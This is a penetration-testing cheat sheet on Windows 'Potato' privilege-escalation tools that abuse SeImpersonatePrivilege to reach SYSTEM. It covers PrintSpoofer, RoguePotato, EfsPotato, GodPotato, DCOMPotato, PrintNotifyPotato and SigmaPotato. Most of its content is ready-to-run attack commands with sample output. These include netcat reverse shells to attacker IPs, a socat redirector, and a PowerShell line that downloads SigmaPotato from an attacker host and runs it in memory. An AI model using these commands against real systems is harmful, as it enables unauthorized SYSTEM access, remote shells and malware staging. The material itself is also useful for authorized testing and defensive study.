> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

## Requirements and common gotchas

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Check privileges quickly:

```cmd
whoami /priv | findstr /i impersonate
```

Operational notes:

- If your shell runs under a restricted token lacking SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), regain the account’s default privileges using FullPowers, then run a Potato. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requires an OXID resolver reachable on TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
- EfsPotato/SharpEfsPotato abuse MS-EFSR; if one pipe is blocked, try alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; try a different pipe/transport or ensure the target service is running.

## Quick Demo

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Notes:
- You can use -i to spawn an interactive process in the current console, or -c to run a one-liner.
- Requires Spooler service. If disabled, this will fail.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```

If outbound 135 is blocked, pivot the OXID resolver via socat on your redirector:

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato is a newer COM abuse primitive released in late 2022 that targets the **PrintNotify** service instead of Spooler/BITS. The binary instantiates the PrintNotify COM server, swaps in a fake `IUnknown`, then triggers a privileged callback through `CreatePointerMoniker`. When the PrintNotify service (running as **SYSTEM**) connects back, the process duplicates the returned token and spawns the supplied payload with full privileges.

Key operational notes:

* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
* Accepts either a direct command or an interactive mode so you can stay inside the original console. Example:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Because it is purely COM-based, no named-pipe listeners or external redirectors are required, making it a drop-in replacement on hosts where Defender blocks RoguePotato’s RPC binding.

Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Tip: If one pipe fails or EDR blocks it, try the other supported pipes:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Notes:
- Works across Windows 8/8.1–11 and Server 2012–2022 when SeImpersonatePrivilege is present.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato provides two variants targeting service DCOM objects that default to RPC_C_IMP_LEVEL_IMPERSONATE. Build or use the provided binaries and run your command:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (updated GodPotato fork)

SigmaPotato adds modern niceties like in-memory execution via .NET reflection and a PowerShell reverse shell helper.

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
